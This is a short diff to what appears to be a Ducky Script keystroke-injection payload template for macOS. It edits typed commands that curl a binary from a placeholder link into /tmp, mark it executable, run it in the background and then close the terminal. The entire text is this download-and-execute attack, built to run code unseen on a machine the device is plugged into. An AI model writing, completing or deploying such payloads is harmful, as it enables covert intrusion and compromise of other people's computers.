@@ -7,8 +7,6 @@ DELAY 100
 ENTER
 DELAY 300
 REM DOUBLE CHECK WHERE THE TEMPORARY FOLDER IS
-STRING curl {link} -o /tmp/r; chmod +x /tmp/r; /tmp/r{close_terminal
-DELAY 50
+STRING curl {link} -o /tmp/r; chmod +x /tmp/r; /tmp/r{run_background}
 ENTER
-DELAY 200
-COMMAND w
+{close_mac_shell}
